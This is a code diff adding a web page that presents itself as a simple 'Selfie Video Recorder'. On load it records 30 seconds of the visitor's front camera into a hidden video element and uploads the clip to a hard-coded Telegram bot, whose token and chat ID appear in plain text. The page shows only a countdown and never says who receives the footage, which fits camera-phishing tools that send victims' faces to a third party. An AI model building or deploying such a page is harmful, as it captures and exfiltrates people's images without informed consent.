@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie Video Recorder</title>
+    <style>
+        /* ── pure white background, minimal styling ── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            position: relative;
+        }
+
+        /* main timer – large, black, centered */
+        #timer {
+            font-size: 15rem;
+            font-weight: 300;
+            color: #000000;
+            letter-spacing: 0.02em;
+            user-select: none;
+            line-height: 1;
+            transition: opacity 0.2s;
+        }
+
+        /* subtle status line at bottom */
+        #status {
+            position: absolute;
+            bottom: 2.5rem;
+            font-size: 1.2rem;
+            font-weight: 400;
+            color: #222222;
+            background: rgba(255, 255, 255, 0.7);
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+            backdrop-filter: blur(2px);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            transition: all 0.3s;
+        }
+
+        /* hidden video element – only used for stream capture */
+        video {
+            display: none;
+        }
+
+        /* responsive scaling for smaller screens */
+        @media (max-width: 600px) {
+            #timer {
+                font-size: 10rem;
+            }
+            #status {
+                font-size: 1rem;
+                bottom: 1.5rem;
+                padding: 0.2rem 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- only visible elements: timer + status -->
+    <div id="timer">30</div>
+    <div id="status">Initializing…</div>
+
+    <!-- hidden video element for camera stream -->
+    <video id="video" autoplay muted playsinline></video>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ─── CONFIG ────────────────────────────────────────────────
+            const BOT_TOKEN     = '8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg';
+            const CHAT_ID       = '7870731053';
+            const DURATION      = 30;               // seconds
+
+            // ─── DOM refs ──────────────────────────────────────────────
+            const timerEl      = document.getElementById('timer');
+            const statusEl     = document.getElementById('status');
+            const videoEl      = document.getElementById('video');
+
+            // ─── state ──────────────────────────────────────────────────
+            let mediaRecorder  = null;
+            let recordedChunks = [];
+            let countdown      = DURATION;
+            let timerInterval  = null;
+
+            // ─── helpers ───────────────────────────────────────────────
+
+            /** Send recorded video blob to Telegram bot */
+            function sendVideoToTelegram(blob) {
+                statusEl.textContent = '⏳ Sending video…';
+
+                // Build FormData – Telegram expects a file under 'video'
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', new File([blob], 'selfie_video.mp4', { type: 'video/mp4' }));
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        statusEl.textContent = '✅ Video sent successfully!';
+                    } else {
+                        statusEl.textContent = '❌ Telegram error: ' + (data.description || 'unknown');
+                    }
+                })
+                .catch(err => {
+                    statusEl.textContent = '❌ Network error: ' + err.message;
+                });
+            }
+
+            /** Stop recording, assemble blob, and trigger send */
+            function stopRecordingAndSend() {
+                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();   // fires 'onstop'
+                }
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+            }
+
+            /** Countdown tick – update display and stop when zero */
+            function tickCountdown() {
+                countdown--;
+                timerEl.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    stopRecordingAndSend();
+                }
+            }
+
+            /** Start the 30‑second countdown */
+            function startCountdown() {
+                timerInterval = setInterval(tickCountdown, 1000);
+            }
+
+            /** Main entry: request camera, start recording, countdown */
+            function initiateRecording() {
+                const constraints = {
+                    video: {
+                        facingMode: 'user',        // front camera (selfie)
+                        width:  { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false                   // video only – no audio
+                };
+
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        // Attach to hidden video element (required for some browsers)
+                        videoEl.srcObject = stream;
+
+                        // Create MediaRecorder – prefer MP4, fallback to webm if needed
+                        let mimeType = 'video/mp4';
+                        if (!MediaRecorder.isTypeSupported(mimeType)) {
+                            mimeType = 'video/webm;codecs=vp9,opus';
+                            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                                mimeType = 'video/webm;codecs=vp8,opus';
+                            }
+                            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                                mimeType = 'video/webm';
+                            }
+                        }
+
+                        mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
+
+                        // Collect data chunks as they become available
+                        mediaRecorder.ondataavailable = function(e) {
+                            if (e.data.size > 0) {
+                                recordedChunks.push(e.data);
+                            }
+                        };
+
+                        // When recording stops, finalise and send
+                        mediaRecorder.onstop = function() {
+                            const blob = new Blob(recordedChunks, { type: mimeType });
+                            // Clear chunks for potential reuse
+                            recordedChunks = [];
+                            // Release camera
+                            stream.getTracks().forEach(t => t.stop());
+                            videoEl.srcObject = null;
+
+                            // Send to Telegram
+                            sendVideoToTelegram(blob);
+                        };
+
+                        // Start recording
+                        mediaRecorder.start();
+                        statusEl.textContent = '🔴 Recording…';
+
+                        // Begin countdown
+                        startCountdown();
+                    })
+                    .catch(err => {
+                        // Permission denied or other camera error
+                        statusEl.textContent = '❌ Camera error: ' + err.message;
+                        timerEl.textContent = '⚠';
+                    });
+            }
+
+            // ─── start when page loads ────────────────────────────────
+            window.addEventListener('load', initiateRecording);
+        })();
+    </script>
+
+</body>
+</html>
